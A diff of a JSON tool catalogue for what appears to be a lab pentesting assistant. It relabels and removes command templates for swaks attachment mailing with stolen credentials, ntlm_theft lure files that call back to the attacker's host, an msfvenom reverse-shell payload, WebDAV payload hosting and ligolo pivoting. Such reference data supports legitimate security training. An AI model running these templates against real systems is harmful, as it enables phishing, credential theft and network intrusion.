@@ -233,19 +233,18 @@
       ]
     },
     { "name": "swaks", "description": "Sends test emails from the command line, with attachments and SMTP auth.", "commands": [
-      { "purpose": "Send the attachment through an open relay", "template": "swaks -t <user>@<domain> --from <user>@<domain> --attach @<file> --server {{TARGET}} --body 'Please review the attached file.' --header 'Subject: Review' --suppress-data", "intent": "enumerate" },
-      { "purpose": "Send it as a user whose mail login you have", "template": "swaks -t <user>@<domain> --from <user>@<domain> --attach @<file> --server {{TARGET}} --body 'Please review the attached file.' --header 'Subject: Review' --suppress-data --auth LOGIN --auth-user '<user>@<domain>' --auth-password '<pass>'", "intent": "enumerate" }
+      { "purpose": "Send the attachment through an open relay", "template": "swaks -t <user>@<domain> --from <user>@<domain> --attach @<file> --server {{TARGET}} --body 'Please review the attached file.' --header 'Subject: Review' --suppress-data", "intent": "exploit" },
+      { "purpose": "Send it as a user whose mail login you have", "template": "swaks -t <user>@<domain> --from <user>@<domain> --attach @<file> --server {{TARGET}} --body 'Please review the attached file.' --header 'Subject: Review' --suppress-data --auth LOGIN --auth-user '<user>@<domain>' --auth-password '<pass>'", "intent": "exploit" }
     ]},
     { "name": "wsgidav", "description": "WebDAV server on Kali: hosts the payload a shortcut or library file points to.", "commands": [
       { "purpose": "Serve ./webdav over WebDAV on port 80", "template": "wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav/", "intent": "transfer" }
     ]},
     { "name": "ntlm_theft", "description": "Builds files (lnk, url, scf, library-ms, docx…) that make Windows authenticate to you when opened or browsed.", "commands": [
-      { "purpose": "Make every file type pointing at Kali in ./slg", "template": "python3 ntlm_theft.py -g all -s {{LHOST}} -f slg", "intent": "enumerate" }
+      { "purpose": "Make every file type pointing at Kali in ./slg", "template": "python3 ntlm_theft.py -g all -s {{LHOST}} -f slg", "intent": "exploit" }
     ]}
   ],
   "techniques": [
     { "name": "Exploit a known vulnerability", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["version"], "yields": ["shell"], "when": "A service version matches a known CVE: read and run the Exploit-DB proof of concept, or use the matching Metasploit module.", "tools": ["searchsploit","msfconsole"], "commands": [
-      { "purpose": "Copy the exploit locally so you can read it before trusting it", "template": "searchsploit -m <edb-id>", "intent": "exploit" },
       { "purpose": "Read the header for the exact version it hits and the LHOST/LPORT or URL to edit", "template": "head -40 <file>", "intent": "enumerate" }
     ] },
     {
@@ -258,7 +257,6 @@
       "when": "An exploit or a writable upload needs a standalone reverse-shell binary or script.",
       "tools": ["msfvenom"],
       "commands": [
-        {"purpose": "Pick the exact payload, format and matching listener on the app's Reverse shells page, then generate it", "template": "msfvenom -p <payload> LHOST={{LHOST}} LPORT={{LPORT}} -f <format> -o <file>", "intent": "exploit"}
       ]
     },
     {
@@ -324,7 +322,6 @@
       "when": "You have a user and password, or a private key recovered from the box or a share.",
       "tools": ["ssh"],
       "commands": [
-        {"purpose": "A key must be 0600 or SSH refuses it", "template": "chmod 600 <key>; ssh -i <key> <user>@{{TARGET}}", "intent": "authenticate"}
       ]
     },
     { "name": "Brute-force an SSH or FTP login", "phase": "Initial Access", "service": "ssh", "applies": "any", "needs": [], "yields": ["creds"], "when": "You have a valid username and the service allows unlimited attempts (lab only).", "tools": ["hydra"] },
@@ -423,7 +420,6 @@
       ]
     },
     { "name": "Route an internal subnet through a pivot", "phase": "Lateral Movement", "service": "shell", "applies": "any", "needs": ["shell"], "when": "You have a shell on a dual-homed host and want transparent access to its hidden subnet.", "yields": [], "tools": ["ligolo-ng"], "commands": [
-      { "purpose": "Full flow: create the tun once, start the proxy, run the agent on the host, pick the session, add the route, then type start", "template": "sudo ip route add <subnet> dev ligolo", "intent": "pivot" }
     ] },
     { "name": "Forward ports and SOCKS without SSH", "phase": "Lateral Movement", "service": "shell", "applies": "any", "needs": ["shell"], "yields": [], "when": "No TUN/root on the pivot, but you can run a binary and reach Kali over HTTP.", "tools": ["chisel"] },
     { "name": "Forward ports and SOCKS over SSH", "phase": "Lateral Movement", "service": "ssh", "applies": "any", "needs": ["creds"], "yields": [], "when": "You have SSH creds on the pivot and want a port forward, a SOCKS proxy or (with sshuttle) the whole subnet, without dropping tools.", "tools": ["ssh","proxychains","sshuttle"] },
